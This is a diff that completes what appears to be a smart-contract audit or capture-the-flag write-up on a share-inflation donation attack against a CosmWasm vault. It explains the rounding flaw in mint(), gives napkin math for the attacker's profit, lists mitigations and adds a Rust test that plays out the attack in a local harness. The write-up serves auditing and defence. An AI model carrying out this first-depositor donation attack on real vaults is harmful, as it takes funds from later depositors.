@@ -393,16 +393,188 @@ Also, it would probably be safer if the flashloan receiver were also the info.se
 
 ### Description
 
-The bug occurs in ...
+The issue with this code is that the shares calculation can be inflated by an attacker, by donating directly
+to the contract. This is an issue known to affect EIP 4626 vaults, in solidity-land, but it can apply to
+many vault implementations.
+[Good blog](https://tienshaoku.medium.com/eip-4626-inflation-sandwich-attack-deep-dive-and-how-to-solve-it-9e3e320cc3f1)
+
+We can look at how the shares are calculated to see why, in mint() under src/contract.rs L58:
+```rust
+    // share = asset * total supply / total assets
+    let mint_amount = if total_supply.is_zero() {
+        amount
+    } else {
+        amount.multiply_ratio(total_supply, total_assets)
+    };
+```
+
+On the very first deposit to the contract, if an attacker just deposits 1 wei, they are minted one share.
+total_supply is the total number of shares issued, while total_assets represents the balance of the contract:
+```rust
+    let total_assets = contract_balance.amount - amount;
+```
+
+We don't have to call mint() to increase the balance of this contract! We can simply transfer ("donate")
+to it directly! So if we donate 1e18 wei, our initial 1 share is now worth 1e18 + 1 wei, and the exchange
+value of the share increases with each additional deposit to the contract.
+
+So what happens now if the next mintooor tries to deposit less than the contract balance?
+
+Well [per the docs for multiply_ratio](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Uint128.html#method.multiply_ratio)
+"Due to the nature of the integer division involved, the result is always floored. E.g. 5 * 99/100 = 4."
+
+So the mint_amount will round down to 0, which will lead the execution to revert, under mint() in contract.rs:
+```rust
+    if mint_amount.is_zero() {
+        return Err(ContractError::ZeroAmountNotAllowed {});
+    }
+```
+
+This will potentially cause some frustration for users. But the situation gets worse, because the attacker
+will be able to withdraw more than they deposited (ie, since the exchange rate of 1 share is so high, and
+the mint_amount calculation rounds down).
+```rust
+    let asset_to_return = shares.multiply_ratio(total_assets, total_supply);
+```
+
+Here's some napkin math:
+
+1) empty vault...
+
+2) mint shares for 1 asset = 1 share
+
+3) donate 1000, exchange rate now (shares = asset * 1 / 1001)
+
+4a) next user mints shares for 2000 assets, shares = 2000 * 1 / 1001 = 1 share
+
+4b)total_supply is now 2, total assets is 3001
+
+4c)exchange rate is now (shares = asset * 2 / 3001) or (asset = shares * 3001 / 2)
+
+5)now we burn the share, at the expense of the last user
+
+6)our initial one share is now worth 1500. we deposited 1 and donated 1000, so our profit is (1500 - 1000 + 1) = 499
+
+-the profit scales up for each additional deposit
+
+-other users' shares are worth less with each attacker burn
+
+-additionally if, for eg, a lending protocol allows cross-collateral lending and the shares are debt tokens,
+all kinds of rektage can occur against the protocol as we have seen too many times now in the space
 
 ### Recommendation
 
-The fix should be ...
+Mitigating measures could take several forms depending on the context in which this vault is being used. Here are some suggestions:
+
+-deposit a dust amount on vault creation to make the attack un-economical
+
+-disallow smol deposits less than a certain amount
+
+-enforce a minimum lockup time to prevent first depositor from sandwiching other users
+
+-track the total asset deposits for minting as a variable in contract state, separately from the total contract balance
+  -if there is some mismatch, the excess shares could be skimmed to another contract for retrieval
+
+-rounding up instead of down would make this attack unprofitable (or rather, the difference would accrue to protocol instead of attacker),
+but donation would have other undesirable behaviors, if someone felt like griefing them
+
+maybe like?:
+```rust
+    let ratio = (u128(total_supply), u128(total_assets));
+    let mint_amount = if total_supply.is_zero() {
+        amount
+    } else {
+        amount.check_mul_ceil(ratio).unwrap()
+    };
+```
+-think carefully about the implications of integrating these shares into any lending protocol
 
 ### Proof of concept
 
 ```rust
-// code goes here
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // mint funds to user
+        app = mint_tokens(app, USER.to_owned(), Uint128::new(10_000));
+
+        // mint shares for user
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(1, DENOM)],
+        )
+        .unwrap();
+
+        // donate funds to contract
+        app.send_tokens(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &[coin(5_000, DENOM)],
+        )
+        .unwrap();
+
+        // mint funds to user2
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
+
+        // mint shares for user2
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Mint {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // query user
+        let balance: Balance = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::UserBalance {
+                    address: USER.to_string(),
+                },
+            )
+            .unwrap();
+
+        // burn shares for user
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Burn {
+                shares: balance.amount,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // burn shares for user2
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Burn {
+                shares: balance.amount,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // user 1 profits off donation/sandwich
+        let bal = app.wrap().query_balance(USER, DENOM).unwrap();
+        assert!(bal.amount > Uint128::new(10_000));
+
+        // user 2 has a loss
+        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
+        assert!(bal.amount < Uint128::new(10_000));
+
+        let bal = app
+            .wrap()
+            .query_balance(contract_addr.to_string(), DENOM)
+            .unwrap();
+        assert_eq!(bal.amount, Uint128::zero());
+    }
 ```
 
 ---
